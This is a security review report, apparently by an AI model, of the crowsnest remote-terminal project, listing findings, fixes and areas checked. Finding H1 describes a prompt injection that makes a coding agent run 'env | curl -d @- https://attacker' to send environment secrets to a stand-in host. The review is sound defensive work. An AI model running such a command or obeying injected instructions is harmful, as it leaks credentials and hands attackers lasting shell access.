# R1 (Opus): security review of crowsnest at `main` (86a6f9d)

Read-only review. I read the code and reasoned about it. Nothing was built, run or tested, and
no herdr was started. Line numbers are at 86a6f9d.

Count: **0 critical, 1 high, 3 medium, 5 low, 7 info.**

---

## Findings, most severe first

### H1 (high): secrets from the environment reach every child process, including the herdr server that spawns all panes and agents

- **Where:** `internal/term/process.go:94-96` (`childEnv`), `internal/herdr/session.go:63-72` (`ScrubEnv`), `:118-121` (`withDefaults` uses `os.Environ()`), `:201-202` (`herdr … server` gets `opts.Environ`); used by `internal/term/tui.go:62` and `internal/term/pane.go:64`.
- **Weakness:** `ScrubEnv` removes only `HERDR_*`. The documented ways to pass secrets are environment variables: `CROWSNEST_PASSWORD` ("prefer env") and `ELEVENLABS_API_KEY` ("prefer the env var", `options.go:67,81`). When crowsnest starts the session's server (the normal first run), that server is spawned with crowsnest's full environment. The herdr TUI client and every `terminal session control` process also get it. herdr spawns pane shells and agents from its server process. I did not verify herdr's own behaviour, but unless it scrubs, every shell, the orchestrator Claude and every worker agent inherit `CROWSNEST_PASSWORD` and `ELEVENLABS_API_KEY`. DESIGN 4.9 says secrets are "never placed in argv of a child process". That holds for argv, but the environment is the same exposure (`/proc/<pid>/environ` on Linux, `env` in any pane).
- **Exploit:** An agent runs in `auto` or `bypassPermissions` mode on attacker-influenced content: a README, an issue, a web page it fetched. A prompt injection makes it run `env | curl -d @- https://attacker`. The attacker now has the crowsnest login password and the paid ElevenLabs key. With the password, anyone who can reach the port has a durable shell: a tailnet peer, or anyone at all when the bind is open. It survives the agent being stopped, and every session it creates lasts 30 days with sliding expiry. A short-lived injection becomes standing remote access.
- **Fix:** After `config.Load`, `os.Unsetenv` the secret variables (`CROWSNEST_PASSWORD`, `ELEVENLABS_API_KEY`, and also `CROWSNEST_PASSWORD_FILE`, `SUPPRESS_AUTH`, `CROWSNEST_NO_AUTH`, `CROWSNEST_I_KNOW_THIS_IS_OPEN`). Also make `ScrubEnv` drop `CROWSNEST_*` (except the orchestrator's deliberate `CROWSNEST`/`CROWSNEST_SESSION`, which `paneEnv` adds explicitly) and `ELEVENLABS_*`. Add a test that the env given to `startServer`, the TUI and the pane bridge has no secret. Document that a herdr session crowsnest did not start keeps whatever environment it was started with.

### M1 (medium): the login rate limiter can be bypassed by concurrent requests (check-then-record race)

- **Where:** `internal/auth/auth.go:143-148`; `internal/auth/limiter.go:41-66`.
- **Weakness:** `Login` calls `limiter.Allow` (takes the lock, counts, releases), then compares credentials, then `RecordFailure` (takes the lock again). Nothing reserves the attempt between the two. Every request that reaches `Allow` before the earlier ones have recorded their failure is admitted. That applies to both the 5-per-IP cap and the 20-global cap.
- **Exploit:** An attacker who can reach the port (a tailnet peer, a LAN host on an open bind, or a local user) sends bursts of a few hundred parallel `POST /api/v1/auth/login` requests over many keep-alive or HTTP/2 connections. The compare is two SHA-256s, so the window is short. But a burst arrives and is parsed concurrently, so far more than 20 guesses get through per minute before the counters catch up. Then the attacker waits out the window and repeats. A weak password is the only thing between the attacker and a shell.
- **Fix:** Make the check and the count atomic: in one locked call, refuse when over the cap; otherwise append a failure timestamp now. On a successful login, remove that entry (or `Reset`). Optionally serialise `Login` with a mutex. Login volume is tiny, so the cost is nil.

### M2 (medium): the session cookie is not port-scoped, so any other server on the same host name receives it

- **Where:** `internal/httpd/api.go:105-117` (`setSessionCookie`: name `crowsnest_session`, `Path: /`, `Secure` only over HTTPS).
- **Weakness:** Browsers scope cookies by host, not port, and `SameSite=Strict` treats `localhost:5173` and `localhost:2769` as the same site. So every HTTP service the browser visits on the same host name gets `crowsnest_session` on top-level navigations and same-site subrequests. That covers `localhost`, the tailnet IP, the machine name, or a MagicDNS name fronted by `tailscale serve`. The token is a shell.
- **Exploit:** Jeff runs some untrusted code that listens on localhost: a cloned project's `npm run dev`, a container with a published port, a tool's local web UI. He opens it in the same browser, and that server logs the `Cookie` header. It replays the token against `127.0.0.1:2769`, which it can reach because it is local, and opens `/api/v1/term/tui` (with an `Origin` it sets itself, since it is not a browser). That is a shell as Jeff, possibly from a sandbox or container that was not meant to have one. The same happens with any other service on the tailnet IP or the MagicDNS name.
- **Fix:** Over HTTPS (built-in TLS or `tailscale serve`), use the `__Host-crowsnest_session` name: Secure, no Domain, Path `/`. That stops cookie tossing, but browsers still share host cookies across ports, so also recommend a dedicated host name for crowsnest (its own MagicDNS or `tailscale serve` name). For plain HTTP on localhost, document the risk in DESIGN 4 under residual risk. Optionally bind a session to the `Host:port` it was issued for (store it with the session row; reject a mismatch in `requireAuth`). That does not stop a replay that sets Host, but it does stop a cookie set from a sibling port being accepted.

### M3 (medium): the release job exposes a write-scoped token to the whole dependency install and test run; actions are pinned to mutable tags

- **Where:** `.github/workflows/release.yml:12-13` (`contents: write` for the job), `:24` (`actions/checkout@v5` with the default `persist-credentials: true`), `:31-34` (`mise run setup` = `npm ci` with install scripts, then the full suite), `:22,27,36` (actions pinned to tags such as `@v5`, `@v3`, `@v7`); also `ci.yml:21-22`.
- **Weakness:** checkout writes the `contents: write` `GITHUB_TOKEN` into `.git/config`. Every later step can read it, including every npm `postinstall` script in `web/`'s dependency tree and every test. The `env:` on the goreleaser step does not limit that. Tag pins can be moved by whoever controls the action repository. `cache: true` in the release job restores a mise cache that runs on other refs may have written.
- **Exploit:** A transitive npm dependency is compromised (a recurring real event). On the next `v*` tag, its install script reads the token from `.git/config` and swaps the binaries in the GitHub release that `goreleaser` just created, or pushes a commit or tag. Users who install the release get a backdoored crowsnest, which is a remote shell by design.
- **Fix:** Split the job. A `check` job with `contents: read` runs setup and tests. A `release` job (`needs: check`, `contents: write`) checks out with `persist-credentials: false` and runs only goreleaser. If goreleaser needs the web build, build it with `npm ci --ignore-scripts`, or pass it in as an artifact from the read-only job. Pin all three actions to full commit SHAs, with the tag in a comment. Set `cache: false` in the release job.

### L1 (low): any network peer can keep the real user locked out indefinitely

- **Where:** `internal/auth/limiter.go:50-52` (global cap), `auth.go:143` (checked before the credential compare).
- **Weakness:** Once 20 failures land in a minute, every login is refused, including the correct one. One unauthenticated peer can do that from one IP spread over 4 rotating IPs, or from one IPv6 /64.
- **Exploit:** A tailnet peer or LAN host runs a loop of 20 bad logins every 60 s. Jeff can never sign in from a new device until he finds and stops it. Existing sessions keep working. DESIGN 4.2 states this trade, so this is availability, not compromise.
- **Fix:** Turn the global cap into a delay rather than a refusal. Or let a client whose own per-IP bucket is clean through the global cap after a short delay. Or exempt loopback, so `tailscale serve` and local logins always work.

### L2 (low): `--demo` shares the real instance's database and state directory

- **Where:** `cmd/crowsnest/serve.go:67` (`store.Open(cfg.DatabasePath())` for demo too), `cmd/crowsnest/orchestrator.go:51-53` (`KV: db`, `StateDir: cfg.StateDir`), `internal/orch/orch.go:313-318`.
- **Weakness:** With the default `--session crowsnest`, a demo instance opens `~/.local/share/crowsnest/crowsnest.db`, the real one. It writes `orchestrator.session_id` / `orchestrator.pane_id` and login sessions into it, and rewrites `CROWSNEST.md` in the real state dir. A demo login under the same credentials creates a session row the real instance accepts. Because of M2 the cookie is also sent across ports on the same host.
- **Exploit:** Mostly integrity. A demo run for screenshots leaves a fake session id that the real orchestrator then tries to `--resume`. Auth impact: a demo instance exposed more widely ("it's only the demo") hands out tokens that are valid on the real instance on the same machine.
- **Fix:** Under `--demo`, use an in-memory store (or a temp DB) and a temp state dir, as the commit message "throwaway state" suggests was intended.

### L3 (low): no body read timeout or connection cap, so an unauthenticated client can exhaust the server

- **Where:** `internal/httpd/server.go:144-149` (only `ReadHeaderTimeout` and `IdleTimeout`; no `ReadTimeout`, no `MaxHeaderBytes`, no limit on concurrent connections).
- **Exploit:** A peer opens thousands of connections to `POST /api/v1/auth/login`, sends headers promptly and then dribbles a body of up to 4 KiB one byte at a time. Each connection pins a goroutine and a file descriptor until the process hits its fd limit. New logins, SSE and terminals then fail.
- **Fix:** Wrap the login body read in a short deadline (`http.ResponseController.SetReadDeadline`, or `ReadTimeout` applied per route; SSE and WebSockets need it off). Cap concurrent connections with a `netutil.LimitListener`-style wrapper.

### L4 (low): `SUPPRESS_AUTH`, a generic variable from Jeff's other projects, turns auth off

- **Where:** `internal/config/options.go:69`.
- **Weakness:** `SUPPRESS_AUTH=true` is the dev bypass in Jeff's web-app house style. It may well be exported by a project's mise env or direnv, or inherited from an agent's environment (see H1). In a shell where it is set and no credentials are configured, crowsnest goes from "refuse: no login configured" to serving without auth on localhost, or on `--bind tailnet` to every tailnet peer, including shared-in nodes. If credentials are configured too, it refuses, so the failure is limited to the no-credentials case.
- **Fix:** Drop `SUPPRESS_AUTH` and keep only `CROWSNEST_NO_AUTH`. Or honour it only alongside a loopback-only bind.

### L5 (low): permissions on existing directories and files are not enforced

- **Where:** `internal/store/store.go:39` (`MkdirAll(dir, 0o700)` does nothing to an existing directory; the DB file mode is left to the SQLite driver and umask, typically 0644); `internal/config/load.go:297-307` (`--password-file` and the config file are read without checking their mode).
- **Exploit:** `--data-dir` points at an existing directory others can read (a shared volume, `/srv/…`, or `~/.local/share` created 0755 by something else, though the `crowsnest/` subdirectory is usually new). Another local user reads `crowsnest.db`, gets the install salt and the PBKDF2 credential digest, and cracks a weak password offline. A world-readable `config.yaml` or password file holding the password leaks it outright.
- **Fix:** `Chmod` the data and state dirs to 0700 after `MkdirAll` (or refuse if they are group- or world-accessible). Create the DB with 0600 by touching it with `OpenFile(…, 0o600)` before opening. Warn or refuse when the password file or a config file containing `password` is group- or world-readable.

### I1 (info): DESIGN 4.9's `redact` helper does not exist

There is no redact function anywhere in `internal/` or `cmd/`. I found no log line that echoes pane text today. But `POST /keys` logs the key list (`internal/httpd/agents.go:194`), and later notices (`--notify-url`, still unused) will echo pane text. Either build the helper before notices land, or correct DESIGN.

### I2 (info): error bodies pass herdr and orchestrator error text to the client

`internal/httpd/agents.go:243,246` (`herdrErr.Message`) and `internal/httpd/conversation.go:192` (`err.Error()`, which can include file paths and herdr detail). These go to authenticated clients only and are JSON-encoded, so there is no XSS, but it departs from the "say what to do, never what the code hit" rule at `api.go:67`.

### I3 (info): `/agents/{target}/keys` has no key-name allowlist

`internal/httpd/agents.go:202-215` accepts any string of 1 to 32 non-control bytes, 16 keys at a time, and passes it to herdr's `send_keys`. That is not a privilege boundary, since any authenticated user can open a full terminal. But if the endpoint is ever given to a narrower principal (an agent token, a "dialogs only" phone mode), it would need an allowlist (digits, letters, `enter`, `esc`, `ctrl+c`, arrows).

### I4 (info): the host allowlist includes the machine name even on a loopback-only bind

`internal/config/bind.go:164-169` always adds `hostname`, its short form and `<short>.local`. On `--no-auth` bound to localhost this slightly widens the DNS-rebinding surface. Example: a LAN attacker who wins an mDNS race for `quark.local` can serve a page on `http://quark.local:2769` that the host check then accepts for later requests that land on 127.0.0.1. This is hard to pull off, but the names add nothing when the bind is loopback. Consider adding them only when a non-loopback address is bound.

### I5 (info): no cap on concurrent terminal sockets

`internal/httpd/term.go:85-132`: each upgrade spawns a `herdr` process (TUI in a PTY, or pane control) with no per-session or global limit. Only authenticated users can do this, and they have a shell anyway. A runaway reconnect loop in the web client is the realistic risk.

### I6 (info): logout leaves open streams alive for up to one heartbeat, and there is no "sign out everywhere"

`internal/httpd/api.go:217-224` deletes only the caller's session. SSE and terminals notice on their next 20 s heartbeat (`sse.go:70-73`, `term.go:303-306`), as DESIGN states. Revoking a stolen token (M2, H1) requires changing the password and restarting. A "sign out all sessions" action (delete all rows) would be cheap.

### I7 (info): `--no-auth` on `tailnet` counts as "not open"

`internal/config/bind.go:179-181`. That is by design, but a tailnet often includes shared-in users' nodes and tagged servers, depending on ACLs. The startup warning (`serve.go:56-58`) could say "anyone on your tailnet who the ACL lets reach this port".

---

## Checked and found sound

- **Bind resolution** (`bind.go`): the default is `localhost` → 127.0.0.1 plus an optional ::1. No path reaches the unspecified address unless `0.0.0.0`, `::` or `::ffff:0.0.0.0` is typed. Port-only values (`:8080`), `host:port` with a name, and `ip:0` are refused. `tailnet` with no Tailscale address refuses rather than falling back. Interface names cannot shadow keywords. IPv4-mapped addresses are unmapped before the open check. Zoned and link-local addresses count as open. An interface that has both a tailnet and a LAN address is refused under `--no-auth` because each listener is checked separately.
- **Startup refusals** (`startup.go`, `load.go:270-294`): there is no login and no `--no-auth`; `--no-auth` is given with a username; a username is given without a password or the other way round; a password comes from both a source and a file; `--session default`. Unknown config keys are errors, and a bare duration is refused.
- **Credential compare** (`auth.go:157-163`): constant-time over SHA-256 digests, both halves always compared. The failed-login log has no username.
- **Sessions**: 32 bytes from crypto/rand, stored as SHA-256. Login always issues a new token, so there is no fixation. Expiry is enforced server-side. The credential digest is checked on every request, so a password change kills all sessions. Stale rows are cleaned at start and hourly. The cookie is `HttpOnly`, `SameSite=Strict`, and `Secure` over TLS or loopback-proxied HTTPS. `X-Forwarded-Proto` is trusted only from loopback and only adds `Secure`. `X-Forwarded-For` is ignored.
- **Host check** (`middleware.go:45-75`): case-folded and trailing dot stripped; ports and IPv6 brackets handled via `SplitHostPort`; any loopback literal accepted (it cannot be produced by rebinding). It applies with `--no-auth`. Go's `net/http` rejects control bytes in Host before it is logged.
- **Origin check**: required on every non-GET/HEAD request and every upgrade. `null` and absent are refused, the scheme must be http or https, the host must pass the allowlist and equal Host, with default ports normalised. `X-Crowsnest: 1` is required on non-GET. `coder/websocket.Accept` re-checks Origin against Host by default (second layer). There is no state-changing GET route: `health`, `me`, `events`, `fleet`, `screen`, `messages` and `orchestrator` only read, and the `term` routes act only after an Origin-checked upgrade. Unknown methods on `/api/` get a JSON 404, and on SPA paths a 405.
- **WebSocket order**: `checkHost` → `checkOrigin` → `requireAuth` → pane id regex → pane must be in the current fleet → then upgrade and spawn. Argv is fixed. A pane id cannot start with `-`, and the session name is validated at startup. A read limit of 256 KiB, a 1 MiB byte-bounded output queue, a 30 s start timeout, size bounds on resize, and session re-check on each ping. Close kills the client or control process only (process group for pane control; signals the TUI client alone).
- **Demo terminals**: `DemoLauncher` spawns nothing (no `exec` in `term/demo.go`). `--demo` does not relax any startup rule, and `LoadForServe` applies to it too (but see L2).
- **CSP and headers**: as in DESIGN 4.7 on every response, including errors and the SPA. `index.html` has no inline script (`/theme-init.js` is a file). `img-src` excludes remote hosts, so a Markdown image cannot beacon out.
- **Untrusted rendering**: `react-markdown` with `skipHtml` and the default `urlTransform` (drops `javascript:`), links get `noopener noreferrer`. Mermaid runs with `securityLevel: "strict"`, and `securityLevel` is in mermaid's default `secure` list, so a `%%{init}%%` directive cannot lower it. The only `dangerouslySetInnerHTML` is the mermaid SVG. DialogCard and screen text render as React text nodes. xterm's `WebLinksAddon` only matches http(s) URLs and opens them with `noopener,noreferrer`.
- **SPA handler** (`spa.go`): `path.Clean` plus an `embed.FS` that cannot climb out. Directories are not listed, and file-looking misses get a real 404.
- **SSE**: auth required, the event name is checked for CR and LF, the payload is JSON, a heartbeat re-checks the session, and an overflowing subscriber is closed.
- **Request log**: method, path, status, duration and client IP only; no query string, headers or bodies. `Config.LogValue` omits the password and the ElevenLabs key.
- **Transcripts** (`transcript/locate.go`): the session id must match `^[A-Za-z0-9][A-Za-z0-9_-]{0,127}$` before it is used in a path or glob. The cwd is flattened to `[A-Za-z0-9-]`, so neither can traverse or inject glob metacharacters. The `{target}` regex is applied before any lookup.
- **herdr client**: the socket path comes from `herdr session list --json` (default under `~/.config/herdr`). NDJSON lines are capped (`readLine`, `maxLineBytes`) and the pane control stdout is capped at 16 MiB per line. Every herdr child gets `HERDR_*` scrubbed, and the server is started with `Setsid` and its log opened at 0600 in a 0700 dir.
- **State files**: `CROWSNEST.md` and the settings are written 0600 in a 0700 state dir. The demo transcripts are 0600 in 0700 dirs.
- **CI**: `ci.yml` runs with `contents: read`, and neither workflow interpolates `github.event.*` into a `run:` (no script injection).

## Not reviewed

- herdr's own behaviour: whether panes and agents inherit the server's environment (the H1 impact assumes they do), its socket permissions, and how it resolves key names in `send_keys`.
- The agent-side unix socket (DESIGN 4.6) and the `job`/`ask`/`say`/`notify`/`hook`/`mcp` subcommands, which are not built yet. Talk mode (`/voice/*`) and `--notify-url`, which are configured but have no code path yet.
- `internal/orch/send.go` and `internal/fleet/*` beyond what the endpoints above call. I did not trace prompt text through `agent.prompt` for herdr-side injection.
- `.goreleaser.yml`, `mise.toml` tasks beyond `setup`, and known CVEs in Go and npm dependencies (no `govulncheck` or `npm audit` was run).
- The web client beyond the rendering sinks listed: routing, `termSocket.ts`, service worker or manifest behaviour.
- Tests. I did not check whether the security behaviour above is covered by tests, and I did not run them.
